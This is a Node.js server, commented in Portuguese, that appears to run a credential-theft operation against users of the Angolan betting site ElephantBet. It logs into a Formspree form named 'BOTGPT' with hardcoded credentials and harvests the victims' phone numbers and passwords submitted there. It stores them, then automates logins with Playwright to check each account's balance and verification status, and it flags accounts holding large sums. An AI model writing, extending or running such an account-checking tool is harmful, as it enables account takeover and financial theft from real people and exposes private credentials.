const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { chromium } = require('playwright');
const path = require('path');

const app = express();
const PORT = 3000;
const LOGIN_URL = 'https://www.elephantbet.co.ao/pt/';
const FORMPREE_LOGIN_URL = 'https://formspree.io/login';
const FORMPREE_EMAIL = 'leolourenco702@gmail.com';
const FORMPREE_SENHA = 'Domingos42@';

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname + '/public'));
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./contas.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS contas (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telefone TEXT NOT NULL, senha TEXT NOT NULL, obs TEXT,
    saldo TEXT DEFAULT '0 Kz', importante INTEGER DEFAULT 0, erro INTEGER DEFAULT 0,
    verificacao TEXT DEFAULT 'NAO IDENTIFICADA',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  db.run(`ALTER TABLE contas ADD COLUMN verificacao TEXT DEFAULT 'NAO IDENTIFICADA'`,()=>{});
});

function dbGet(sql, params=[]) { return new Promise((res,rej)=>{ db.get(sql,params,(e,r)=> e?rej(e):res(r)); }); }
function dbRun(sql, params=[]) { return new Promise((res,rej)=>{ db.run(sql,params,function(e){ if(e) rej(e); else res(this); }); }); }
function limparTelefone(tel){ let dig=String(tel||'').replace(/\D/g,''); if(dig.startsWith('244')) dig=dig.substring(3); if(dig.length>9) dig=dig.slice(-9); return dig; }
function parseSaldo(str){ if(!str) return 0; const up=String(str).toUpperCase(); if(up.includes('DADOS')||up.includes('INVÁLIDA')||up.includes('INVALIDA')||up.includes('NÃO CADASTRADO')||up.includes('VERIFICANDO')||up.includes('FILA')) return 0; let num=String(str).replace(/[^0-9.,]/g,''); if(num.includes('.')&&num.includes(',')) num=num.replace(/\./g,'').replace(',','.'); else if(num.includes(',')) num=num.replace(',','.'); return parseFloat(num)||0; }
function isLixo(m){ if(!m) return true; const l=m.toLowerCase(); if(l.includes('_date')) return true; if(l.includes('contacto')&&l.includes('mensagem')) return true; if(m.length>40) return true; return false; }

app.get('/api/contas', (req,res)=>{ db.all('SELECT * FROM contas ORDER BY id ASC',(e,r)=>res.json(r||[])); });
app.post('/api/contas',async (req,res)=>{ 
  const {telefone,senha}=req.body; 
  if(isLixo(senha)) return res.json({ok:false});
  const telLimpo = limparTelefone(telefone);
  if(!/^9\d{8}$/.test(telLimpo)) return res.json({ok:false});
  const existe = await dbGet('SELECT id FROM contas WHERE telefone=?',[telLimpo]);
  if(existe) return res.json({id:existe.id, jaExiste:true});
  db.run('INSERT INTO contas (telefone,senha,obs,importante,erro) VALUES (?,?,?,?,0)',[telLimpo,senha,`Formpree AUTO`,1], function(){ res.json({id:this.lastID}); }); 
});
app.post('/api/contas/limpar-duplicadas', (req,res)=>{
  db.all('SELECT * FROM contas ORDER BY id ASC', (err, rows)=>{
    if(err) return res.json({ok:false});
    const vistos = new Map(); const dups=[];
    rows.forEach(r=>{ if(vistos.has(r.telefone)) dups.push(r.id); else vistos.set(r.telefone, r.id); });
    if(dups.length===0) return res.json({ok:true, removidas:0});
    db.run(`DELETE FROM contas WHERE id IN (${dups.map(()=>'?').join(',')})`, dups, function(){ res.json({ok:true, removidas:dups.length}); });
  });
});
app.put('/api/contas/:id',(req,res)=>{ const {telefone,senha,obs,importante,saldo}=req.body; const telLimpo=limparTelefone(telefone); db.run('UPDATE contas SET telefone=?, senha=?, obs=?, importante=?, erro=0, saldo=COALESCE(?,saldo) WHERE id=?',[telLimpo,senha,obs,importante?1:0,typeof saldo==='string'?saldo:null,req.params.id], ()=>res.json({ok:true})); });
app.delete('/api/contas',(req,res)=>{ db.run('DELETE FROM contas',[],()=>res.json({ok:true})); });
app.delete('/api/contas/:id',(req,res)=>{ db.run('DELETE FROM contas WHERE id=?',[req.params.id],()=>res.json({ok:true})); });

let rodando=false, inicioIndex=0, modoAtual='auto', manualIndexAtual=0;
let statusAtual={conta:null, log:[], modo:'auto'};
function addLog(msg){ const h=new Date().toLocaleTimeString(); statusAtual.log.unshift(`[${h}] ${msg}`); if(statusAtual.log.length>150) statusAtual.log.pop(); console.log(msg); }
function dbUpdate(sql, params){ return new Promise((res,rej)=>{ db.run(sql, params, function(e){ if(e) rej(e); else res(); }); }); }
async function atualizarSaldoEVerificacao(contaId, saldo, verificacao){
  const atual = await dbGet('SELECT saldo, verificacao FROM contas WHERE id=?',[contaId]);
  if(!atual || atual.saldo !== saldo || atual.verificacao !== verificacao){
    await dbUpdate('UPDATE contas SET saldo=?, verificacao=?, erro=0 WHERE id=?',[saldo, verificacao, contaId]);
  }
}

let economyBrowser = null, economyContext = null, economyPage = null, economyLaunchPromise = null;
let manualBrowser = null, manualContext = null, manualPage = null, manualLaunchPromise = null;

async function getEconomyPage(){
  if(economyPage && !economyPage.isClosed()) return {browser: economyBrowser, context: economyContext, page: economyPage};
  if(economyLaunchPromise) return economyLaunchPromise;
  economyLaunchPromise = (async()=>{
    if(economyBrowser){ try{ await economyBrowser.close(); }catch{} }
    economyBrowser = await chromium.launch({ channel: 'chrome', headless: false });
    economyContext = await economyBrowser.newContext();
    economyPage = await economyContext.newPage();
    return {browser: economyBrowser, context: economyContext, page: economyPage};
  })();
  try{ return await economyLaunchPromise; }
  finally{ economyLaunchPromise=null; }
}
async function getManualPage(){
  if(manualPage && !manualPage.isClosed()) return {browser: manualBrowser, context: manualContext, page: manualPage};
  if(manualLaunchPromise) return manualLaunchPromise;
  manualLaunchPromise = (async()=>{
    if(manualBrowser){ try{ await manualBrowser.close(); }catch{} }
    manualBrowser = await chromium.launch({ channel: 'chrome', headless: false });
    manualContext = await manualBrowser.newContext();
    manualPage = await manualContext.newPage();
    return {browser: manualBrowser, context: manualContext, page: manualPage};
  })();
  try{ return await manualLaunchPromise; }
  finally{ manualLaunchPromise=null; }
}
async function fecharEconomy(){
  if(economyLaunchPromise){ try{ await economyLaunchPromise; }catch{} }
  if(economyBrowser){ try{ await economyBrowser.close(); }catch{} }
  economyBrowser=null; economyPage=null; economyContext=null; economyLaunchPromise=null;
}
async function fecharManual(){
  if(manualLaunchPromise){ try{ await manualLaunchPromise; }catch{} }
  if(manualBrowser){ try{ await manualBrowser.close(); }catch{} }
  manualBrowser=null; manualPage=null; manualContext=null; manualLaunchPromise=null;
}

async function esperar10s(msg){
  addLog(`⏳ ${msg} - 10s antes de clicar...`);
  await new Promise(r=>setTimeout(r,10000));
}
async function esperarSegundos(segundos,msg){
  addLog(`${msg} - ${segundos}s antes de clicar...`);
  await new Promise(r=>setTimeout(r,segundos*1000));
}
async function obterEstadoVerificacao(page){
  await page.waitForFunction(() =>
    document.querySelector('.hdr-user-avatar-icon-bc.user-verified') ||
    document.querySelector('.hdr-user-avatar-icon-bc.user-not-verified'),
    {timeout:5000}
  ).catch(()=>{});
  const verificada = await page.locator('.hdr-user-avatar-icon-bc.user-verified').first().isVisible().catch(()=>false);
  if(verificada) return 'VERIFICADA';
  const naoVerificada = await page.locator('.hdr-user-avatar-icon-bc.user-not-verified').first().isVisible().catch(()=>false);
  if(naoVerificada) return 'NAO VERIFICADA';
  return 'NAO IDENTIFICADA';
}

async function terminarSessaoElephantBet(page){
  try{
    try{
      const naoAgora = page.locator('button:has-text("Não agora")').first();
      if(await naoAgora.isVisible({timeout:1500}).catch(()=>false)){
        await esperarSegundos(1,'Popup Nao agora');
        await naoAgora.click({force:true}).catch(()=>{});
        await page.waitForTimeout(1000);
      }
    }catch{}
    await page.evaluate(() => {
      document.querySelectorAll('[class*="notification"], [class*="popup"]').forEach(el=>{
        if(el.textContent.includes('Know the moment') || el.textContent.includes('Allow Notifications')){ el.style.display='none'; }
      });
    }).catch(()=>{});
    await esperarSegundos(1.5,'Vai clicar SAIR');
    const clicouSair = await page.evaluate(() => {
      const btn = document.querySelector('.userLogoutBtn') || document.querySelector('li.logout-profile button') || Array.from(document.querySelectorAll('button')).find(b=>b.textContent.trim().toUpperCase()==='SAIR');
      if(btn){ btn.scrollIntoView({behavior:'instant', block:'center'}); btn.click(); return true; }
      return false;
    }).catch(()=>false);
    if(!clicouSair){
      const logoutBtn = page.locator('.userLogoutBtn, li.logout-profile button, button:has-text("SAIR")').first();
       if(await logoutBtn.isVisible({timeout:1500}).catch(()=>false)){ await logoutBtn.click({force:true}).catch(()=>{}); }
     }
    await page.waitForTimeout(1500);
    await esperarSegundos(1.5,'Vai clicar ENTRAR apos Sair');
    const entrou = await page.evaluate(() => {
      const entrar = Array.from(document.querySelectorAll('button')).find(b=>b.textContent.trim()==='ENTRAR');
      if(entrar){ entrar.click(); return true; }
      return false;
    }).catch(()=>false);
    if(!entrou){
      const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
       if(await entrarBtn.isVisible({timeout:1500}).catch(()=>false)){ await entrarBtn.click({force:true}).catch(()=>{}); }
     }
    await page.waitForTimeout(1000);
    return true;
  }catch(e){ addLog(`Erro terminar: ${e.message}`); try{ await page.context().clearCookies(); }catch{} await page.waitForTimeout(3000); return true; }
}

async function logarContaEconomica(conta){
  let tentativasConexao = 0;
  const maxTentativas = 3;
  while(tentativasConexao < maxTentativas){
    if(!rodando || modoAtual!=='auto') return 'PARADO';
    try{
      const {page} = await getEconomyPage();
      if(!rodando || modoAtual!=='auto'){ await fecharEconomy(); return 'PARADO'; }
      const jaLogado = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
      if(jaLogado){ await terminarSessaoElephantBet(page); await page.waitForTimeout(3000); }
      const urlAtual = page.url();
      const ehPrimeiraVez = !urlAtual.includes('elephantbet') || urlAtual === 'about:blank';
      if(ehPrimeiraVez){
        await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded', timeout:30000});
        await page.waitForTimeout(3000);
      } else {
        const temCampo = await page.locator('input[name="username"]').first().isVisible().catch(()=>false);
        const temEntrar = await page.getByRole('button',{name:'ENTRAR'}).first().isVisible().catch(()=>false);
        if(!temCampo && !temEntrar){
          await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded', timeout:25000});
          await page.waitForTimeout(3000);
        }
      }
      let phoneInput = page.locator('input[name="username"]');
      let tentativas = 0;
      while(tentativas < 3 && !(await phoneInput.isVisible().catch(()=>false))){
        const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
        if(await entrarBtn.isVisible({timeout:10000}).catch(()=>false)){
          await esperarSegundos(3,'ENTRAR');
          await entrarBtn.click({force:true}).catch(()=>{});
          await page.waitForTimeout(3000);
        } else {
          await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded'}).catch(()=>{});
          await page.waitForTimeout(3000);
        }
        tentativas++;
      }
      await phoneInput.waitFor({state:'visible', timeout:20000}).catch(()=>{});
      if(!(await phoneInput.isVisible().catch(()=>false))){
        await fecharEconomy(); tentativasConexao++; await new Promise(r=>setTimeout(r,5000)); continue;
      }
      await phoneInput.click(); await page.waitForTimeout(1000);
      await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
      await page.waitForTimeout(1000);
      await page.keyboard.type(conta.telefone,{delay:120});
      await page.waitForTimeout(2000);
      const passInput = page.locator('input[name="password"]');
      await passInput.click(); await page.waitForTimeout(1000);
      await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
      await page.waitForTimeout(1000);
      await page.keyboard.type(conta.senha,{delay:120});
      await esperarSegundos(3,'LOGIN Entrar');
      await page.locator('#login_form_id button[type="submit"]').click();
      await page.waitForTimeout(10000);
      const temSaldo = await page.locator('p.balanceAmount').first().isVisible({timeout:5000}).catch(()=>false);
      if(temSaldo){
        const saldoTexto = (await page.locator('p.balanceAmount').first().textContent()).trim();
        const estadoVerificacao = await obterEstadoVerificacao(page);
        await atualizarSaldoEVerificacao(conta.id, saldoTexto, estadoVerificacao);
        await page.waitForTimeout(1000);
        await terminarSessaoElephantBet(page);
        return saldoTexto;
      }
      const erroDiv = page.locator('div.entrance-f-error-message-bc');
      const temErroDiv = await erroDiv.first().isVisible({timeout:3000}).catch(()=>false);
      let textoErro = '';
      if(temErroDiv){ textoErro = (await erroDiv.first().textContent()).trim().toLowerCase(); }
      const erroNormalizado = textoErro.normalize('NFD').replace(/[\u0300-\u036f]/g,'');
      if(temErroDiv && erroNormalizado.includes('cliente excluido')){
        await dbUpdate('UPDATE contas SET saldo=?, erro=2 WHERE id=?',['CLIENTE EXCLUIDO', conta.id]);
        await terminarSessaoElephantBet(page).catch(()=>{});
        return 'CLIENTE EXCLUIDO';
      }
      if(temErroDiv && erroNormalizado.includes('nome de usuario ou senha invalida')){
        await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRETOS', conta.id]);
        await terminarSessaoElephantBet(page).catch(()=>{});
        return 'DADOS INCORRETOS';
      }
      if(temErroDiv && (textoErro.includes('inválida') || textoErro.includes('invalida'))){
        await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRECTOS', conta.id]);
        await terminarSessaoElephantBet(page).catch(()=>{});
        return 'DADOS INCORRECTOS';
      }
      await fecharEconomy(); tentativasConexao++; await new Promise(r=>setTimeout(r,5000)); continue;
    }catch(e){
      await fecharEconomy(); tentativasConexao++; await new Promise(r=>setTimeout(r,5000));
    }
  }
  addLog(`Falha de conexão ao consultar ${conta.telefone}; saldo anterior preservado`);
  return '0 Kz - Falha Conexão';
}

async function logarContaManual(conta){
  let tentativasConexao = 0;
  while(tentativasConexao < 3){
    if(!rodando || modoAtual!=='manual') return 'PARADO';
    try{
      const {page} = await getManualPage();
      if(!rodando || modoAtual!=='manual'){ await fecharManual(); return 'PARADO'; }
      const jaLogado = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
      if(jaLogado){ await terminarSessaoElephantBet(page); await page.waitForTimeout(3000); }
      const urlAtual = page.url();
      const ehPrimeiraVez = !urlAtual.includes('elephantbet') || urlAtual === 'about:blank';
      if(ehPrimeiraVez){
        await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded', timeout:30000});
        await page.waitForTimeout(3000);
      }
      let phoneInput = page.locator('input[name="username"]');
      let tentativas = 0;
      while(tentativas < 3 && !(await phoneInput.isVisible().catch(()=>false))){
        const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
        if(await entrarBtn.isVisible({timeout:10000}).catch(()=>false)){
          await esperarSegundos(3,'Manual ENTRAR');
          await entrarBtn.click({force:true}).catch(()=>{});
          await page.waitForTimeout(3000);
        } else {
          await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded'}).catch(()=>{});
          await page.waitForTimeout(3000);
        }
        tentativas++;
      }
      await phoneInput.waitFor({state:'visible', timeout:20000}).catch(()=>{});
      await phoneInput.click(); await page.waitForTimeout(1000);
      await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
      await page.waitForTimeout(1000);
      await page.keyboard.type(conta.telefone,{delay:100});
      await page.waitForTimeout(2000);
      const passInput = page.locator('input[name="password"]');
      await passInput.click(); await page.waitForTimeout(1000);
      await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
      await page.waitForTimeout(1000);
      await page.keyboard.type(conta.senha,{delay:100});
      await esperarSegundos(3,'Manual Login');
      await page.locator('#login_form_id button[type="submit"]').click();
      await page.waitForTimeout(10000);
      const temSaldo = await page.locator('p.balanceAmount').first().isVisible({timeout:5000}).catch(()=>false);
      if(temSaldo){
        const saldoTexto = (await page.locator('p.balanceAmount').first().textContent()).trim();
        const estadoVerificacao = await obterEstadoVerificacao(page);
        await atualizarSaldoEVerificacao(conta.id, saldoTexto, estadoVerificacao);
        return saldoTexto;
      }
      const erroDiv = page.locator('div.entrance-f-error-message-bc');
      const temErroDiv = await erroDiv.first().isVisible({timeout:3000}).catch(()=>false);
      let textoErro = '';
      if(temErroDiv){ textoErro = (await erroDiv.first().textContent()).trim().toLowerCase(); }
      if(temErroDiv && (textoErro.includes('inválida') || textoErro.includes('invalida'))){
        await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRECTOS', conta.id]);
        return 'DADOS INCORRECTOS';
      }
      const erroNormalizadoManual = textoErro.normalize('NFD').replace(/[\u0300-\u036f]/g,'');
      if(temErroDiv && erroNormalizadoManual.includes('cliente excluido')){
        await dbUpdate('UPDATE contas SET saldo=?, erro=2 WHERE id=?',['CLIENTE EXCLUIDO', conta.id]);
        return 'CLIENTE EXCLUIDO';
      }
      if(temErroDiv && erroNormalizadoManual.includes('nome de usuario ou senha invalida')){
        await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRETOS', conta.id]);
        return 'DADOS INCORRETOS';
      }
      await fecharManual(); tentativasConexao++; await new Promise(r=>setTimeout(r,5000)); continue;
    }catch(e){
      await fecharManual(); tentativasConexao++; await new Promise(r=>setTimeout(r,5000));
    }
  }
  return 'DADOS INCORRECTOS';
}

async function logarConta(conta, manterAberto=false){ if(manterAberto){ return await logarContaManual(conta); } else { return await logarContaEconomica(conta); } }
async function logarContaLeve(conta){ return await logarContaEconomica(conta); }
async function getContasValidas(){ return new Promise((res,rej)=>{ db.all('SELECT * FROM contas WHERE erro=0 OR erro IS NULL ORDER BY id ASC',(err,rows)=> err?rej(err):res(rows)); }); }
async function executarManual(index){
  const contas = await getContasValidas();
  if(contas.length===0){ addLog('Nenhuma valida'); return; }
  if(index >= contas.length) index = 0;
  manualIndexAtual = index; const c = contas[index];
  statusAtual.conta = `[${index+1}/${contas.length}] ${c.telefone} - LOGANDO...`;
  await logarConta(c, true);
  if(!rodando || modoAtual!=='manual') return;
  statusAtual.conta = `[${index+1}/${contas.length}] ${c.telefone} - AGUARDANDO`;
}
async function loopInfinitoAuto(){
  while(rodando && modoAtual==='auto'){
    const contas = await getContasValidas();
    if(contas.length===0){ addLog('Nenhuma valida'); await new Promise(r=>setTimeout(r,10000)); continue; }
    for(let i=inicioIndex;i<contas.length;i++){
      if(!rodando || modoAtual!=='auto') break;
      const c=contas[i]; statusAtual.conta=`[${i+1}/${contas.length}] ${c.telefone} [10s+retry]`; addLog(`[${i+1}] ${c.telefone}`);
      await logarConta(c, false);
    } inicioIndex=0;
  }
}

let formpreeRodando=false, formpreeIniciando=false, formpreeStartId=0, formpreeRecarregando=false, formpreeBrowser=null, formpreePage=null, formpreeInterval=null, formpreeReloadInterval=null;
let formpreeStatus={conta:null, log:[], submissions:[], url:'', total:0};
let processandoFormpree = false;
function addLogFormpree(msg){ const h=new Date().toLocaleTimeString(); formpreeStatus.log.unshift(`[${h}] ${msg}`); if(formpreeStatus.log.length>150) formpreeStatus.log.pop(); console.log('[FORMPREE] '+msg); }

async function extrairSubmissoesFormpree(page){
  try{
    await page.waitForSelector('div[style*="--col-size-contacto"]', {timeout:10000}).catch(()=>{});
    await page.waitForTimeout(1000);
    return await page.evaluate(()=>{
      const results=[]; const contactoEls = Array.from(document.querySelectorAll('div[style*="--col-size-contacto"]')); const mensagemEls = Array.from(document.querySelectorAll('div[style*="--col-size-mensagem"]')); const valorEls = Array.from(document.querySelectorAll('div[style*="--col-size-valor"]'));
      for(let i=0;i<contactoEls.length;i++){ const contacto = (contactoEls[i]?.innerText || '').trim(); const mensagem = (mensagemEls[i]?.innerText || '').trim(); const valor = (valorEls[i]?.innerText || '').trim(); if(!contacto) continue; if(!/^[0-9]{9}$/.test(contacto.replace(/\D/g,''))) continue; if(mensagem.length > 35) continue; if(mensagem.toLowerCase().includes('_date') || contacto.includes('_date')) continue; results.push({ contacto, mensagem, valor }); } return results;
    });
  }catch(e){ return []; }
}

async function checkFormpreeSubmissions(apenasLer = false){
  if(!formpreePage || !formpreeRodando || processandoFormpree) return;
  processandoFormpree = true;
  try{
    const url = formpreePage.url(); formpreeStatus.url = url;
    if(!url.includes('formspree.io')){ processandoFormpree=false; return; }
    addLogFormpree('🔍 Verificando submissões IMEDIATO...');
    const raw = await extrairSubmissoesFormpree(formpreePage);
    addLogFormpree(`📥 Lidas ${raw.length} linhas - verificando valores...`);
    const enriched = [];
    for(const sub of raw){
      const telLimpo = limparTelefone(sub.contacto); const senhaForm = (sub.mensagem||'').trim();
      const valorFormpree = (sub.valor||'').trim();
      const saldoInicial = valorFormpree || '0 Kz';
      if(!telLimpo || !senhaForm) continue; if(!/^9\d{8}$/.test(telLimpo)) continue; if(isLixo(senhaForm)) continue;
      const existe = await dbGet('SELECT * FROM contas WHERE telefone=? ORDER BY id DESC',[telLimpo]);
      let jaCadastrado = false; let saldoBanco = 'Nao cadastrado';
      if(existe){ jaCadastrado = true; saldoBanco = existe.saldo || '0 Kz'; }
      else { try{ await dbRun('INSERT INTO contas (telefone, senha, saldo, obs, importante, erro) VALUES (?,?,?,?,?,0)',[telLimpo, senhaForm, saldoInicial, `Formpree AUTO Valor:${valorFormpree||'0'}`, 1]); addLogFormpree(`✅ NOVO: ${telLimpo} | ${valorFormpree||'0'}`); saldoBanco = saldoInicial; }catch{} }
      const contaAtual = await dbGet('SELECT saldo FROM contas WHERE telefone=? ORDER BY id DESC',[telLimpo]);
      if(contaAtual && contaAtual.saldo){ saldoBanco = contaAtual.saldo; }
      const valorNumerico = parseSaldo(sub.valor);
      const saldoValor = parseSaldo(saldoBanco) || valorNumerico;
      enriched.push({ contacto: sub.contacto, telefoneLimpo: telLimpo, mensagem: senhaForm, valorFormpree: sub.valor || '', valorNumerico, jaCadastrado, saldo: saldoBanco, saldoValor });
      if(valorNumerico >= 200 || saldoValor >= 200){
        addLogFormpree(`🚨 VALOR ALTO: ${telLimpo} = ${valorNumerico}Kz | Saldo: ${saldoBanco}`);
      }
    }
    enriched.sort((a,b)=> (b.saldoValor||b.valorNumerico) - (a.saldoValor||a.valorNumerico));
    formpreeStatus.submissions = enriched;
    if(enriched.length>0){
      const maior = enriched[0];
      const maiorValor = maior.saldoValor || maior.valorNumerico || 0;
      if(maiorValor >= 100){
        formpreeStatus.conta = `🚨 ${maior.telefoneLimpo} | ${maiorValor}Kz - FORMPREE ${maior.valorNumerico}Kz`;
        addLogFormpree(`🔔 ALARME FORMPREE: ${maior.telefoneLimpo} = ${maiorValor}Kz`);
      }
    }
  }catch(e){ addLogFormpree(`Erro: ${e.message}`); }
  processandoFormpree = false;
}

async function startFormpree(){
  if(formpreeRodando || formpreeIniciando) return;
  formpreeIniciando=true;
  const meuStartId=++formpreeStartId;
  try{
    formpreeBrowser = await chromium.launch({ channel:'chrome', headless:false });
    formpreePage = await formpreeBrowser.newPage();
    if(meuStartId!==formpreeStartId){
      await formpreeBrowser.close().catch(()=>{});
      formpreeBrowser=null; formpreePage=null; formpreeIniciando=false;
      return;
    }
    formpreeRodando = true;
  }catch(e){
    formpreeIniciando=false;
    if(formpreeBrowser){ try{ await formpreeBrowser.close(); }catch{} }
    formpreeBrowser=null; formpreePage=null;
    addLogFormpree(`Erro ao abrir Formpree: ${e.message}`);
    return;
  }
  formpreeIniciando=false;
  addLogFormpree('🌐 Formpree ABERTO - 10s antes de cada clique');
  try{ await formpreePage.goto(FORMPREE_LOGIN_URL,{waitUntil:'domcontentloaded'}); }
  catch(e){ addLogFormpree(`Erro ao carregar Formpree: ${e.message}`); await stopFormpree(); return; }
  await formpreePage.waitForTimeout(10000);
  try{
    await formpreePage.waitForSelector('#email-address', {timeout:15000});
    await formpreePage.locator('#email-address').fill(FORMPREE_EMAIL);
    await formpreePage.waitForTimeout(2000);
    await formpreePage.locator('input[type="password"]').first().fill(FORMPREE_SENHA);
    addLogFormpree('⏳ 10s antes Login Formpree');
    await new Promise(r=>setTimeout(r,10000));
    await formpreePage.locator('button[type="submit"]').first().click();
    await formpreePage.waitForTimeout(10000);
    
    addLogFormpree('🔍 Procurando BOTGPT...');
    let botGptBtn = formpreePage.locator('a[href="/forms/mpwjanlj/overview"]').first();
    if(!(await botGptBtn.isVisible({timeout:10000}).catch(()=>false))){
      botGptBtn = formpreePage.locator('a:has-text("BOTGPT")').first();
    }
    if(await botGptBtn.isVisible({timeout:15000}).catch(()=>false)){
      addLogFormpree('⏳ 10s antes BOTGPT');
      await new Promise(r=>setTimeout(r,10000));
      await botGptBtn.click();
      await formpreePage.waitForTimeout(8000);
    } else {
      await formpreePage.goto('https://formspree.io/forms/mpwjanlj/overview', {waitUntil:'domcontentloaded'}).catch(()=>{});
      await formpreePage.waitForTimeout(8000);
    }
    
    addLogFormpree('🔍 Procurando Submissions...');
    let subBtn = formpreePage.locator('a[href="/forms/mpwjanlj/submissions"]').first();
    if(!(await subBtn.isVisible({timeout:8000}).catch(()=>false))){
      subBtn = formpreePage.locator('div.pb-2.border-b-2.border-primary a').first();
    }
    if(!(await subBtn.isVisible({timeout:5000}).catch(()=>false))){
      subBtn = formpreePage.locator('a:has-text("Submissions")').first();
    }
    if(await subBtn.isVisible({timeout:15000}).catch(()=>false)){
      addLogFormpree('⏳ 10s antes Submissions - DEPOIS VERIFICA IMEDIATO');
      await new Promise(r=>setTimeout(r,10000));
      await subBtn.click();
      await formpreePage.waitForTimeout(5000);
    } else {
      await formpreePage.goto('https://formspree.io/forms/mpwjanlj/submissions', {waitUntil:'domcontentloaded'}).catch(()=>{});
      await formpreePage.waitForTimeout(5000);
    }
    
    // VERIFICAÇÃO IMEDIATA APÓS ENTRAR EM SUBMISSIONS - sem esperar mais
    addLogFormpree('✅ Entrou em Submissions - VERIFICANDO AGORA valores...');
    await checkFormpreeSubmissions(false);
    
  }catch(e){ addLogFormpree(`Erro Formpree: ${e.message}`); }
  // Intervalo menor para verificar rápido
  if(!formpreeRodando || !formpreePage) return;
  if(formpreeInterval) clearInterval(formpreeInterval);
  if(formpreeReloadInterval) clearInterval(formpreeReloadInterval);
  formpreeInterval = setInterval(()=>checkFormpreeSubmissions(false), 60000);
  formpreeReloadInterval = setInterval(async ()=>{ 
    if(formpreePage && formpreeRodando && !formpreeRecarregando && !processandoFormpree){
      formpreeRecarregando=true;
      try{ 
        addLogFormpree('🔄 Reload + verificação imediata'); 
        await formpreePage.reload({waitUntil:'domcontentloaded'}); 
        await new Promise(r=>setTimeout(r,5000));
        await checkFormpreeSubmissions(false); 
      }catch{} 
      finally{ formpreeRecarregando=false; }
    } 
  }, 120000);
}

async function stopFormpree(){
  formpreeStartId++;
  formpreeRodando=false;
  formpreeIniciando=false;
  formpreeRecarregando=false;
  if(formpreeInterval) clearInterval(formpreeInterval);
  if(formpreeReloadInterval) clearInterval(formpreeReloadInterval);
  formpreeInterval=null;
  formpreeReloadInterval=null;
  if(formpreeBrowser){ try{ await formpreeBrowser.close(); }catch{} formpreeBrowser=null; formpreePage=null; }
}

app.post('/api/automacao/start',(req,res)=>{ if(rodando) return res.json({ok:false, mensagem:'Automacao ja esta rodando'}); const inicio=parseInt(req.body.inicio||1); inicioIndex=Math.max(0,inicio-1); modoAtual='auto'; statusAtual.modo='auto'; rodando=true; loopInfinitoAuto(); res.json({ok:true}); });
app.post('/api/automacao/auto/start',(req,res)=>{ if(rodando) return res.json({ok:false, mensagem:'Automacao ja esta rodando'}); const inicio=parseInt(req.body.inicio||1); inicioIndex=Math.max(0,inicio-1); modoAtual='auto'; statusAtual.modo='auto'; rodando=true; addLog(`AUTO da ${inicio}`); loopInfinitoAuto(); res.json({ok:true}); });
app.post('/api/automacao/manual/start', async (req,res)=>{ if(rodando) return res.json({ok:false, mensagem:'Automacao ja esta rodando'}); const inicio=parseInt(req.body.inicio||1); manualIndexAtual=Math.max(0,inicio-1); modoAtual='manual'; statusAtual.modo='manual'; rodando=true; await executarManual(manualIndexAtual); res.json({ok:true}); });
app.post('/api/automacao/manual/next', async (req,res)=>{ if(modoAtual!=='manual') return res.json({ok:false}); const contas = await getContasValidas(); if(manualPage){ const jaLogado = await manualPage.locator('p.balanceAmount').first().isVisible().catch(()=>false); if(jaLogado){ await terminarSessaoElephantBet(manualPage); await new Promise(r=>setTimeout(r,1000)); } } manualIndexAtual++; await executarManual(manualIndexAtual); res.json({ok:true}); });
app.post('/api/automacao/stop', async (req,res)=>{ rodando=false; inicioIndex=0; statusAtual.conta=null; statusAtual.modo='auto'; modoAtual='auto'; await fecharManual(); await fecharEconomy(); addLog('PARADA'); res.json({ok:true}); });
app.get('/api/automacao/status',(req,res)=>{ res.json({rodando, modo:modoAtual, manualIndex:manualIndexAtual+1, inicioAtual:inicioIndex+1,...statusAtual}); });
app.post('/api/formpree/start', async (req,res)=>{ await startFormpree(); res.json({ok:true}); });
app.post('/api/formpree/stop', async (req,res)=>{ await stopFormpree(); res.json({ok:true}); });
app.post('/api/formpree/check', async (req,res)=>{ await checkFormpreeSubmissions(true); res.json({ok:true, submissions: formpreeStatus.submissions}); });
app.get('/api/formpree/status',(req,res)=>{ res.json({rodando: formpreeRodando, ...formpreeStatus}); });
app.listen(PORT,()=>console.log(`FORMPREE ALARME + VERIFICA IMEDIATA http://localhost:${PORT}`));
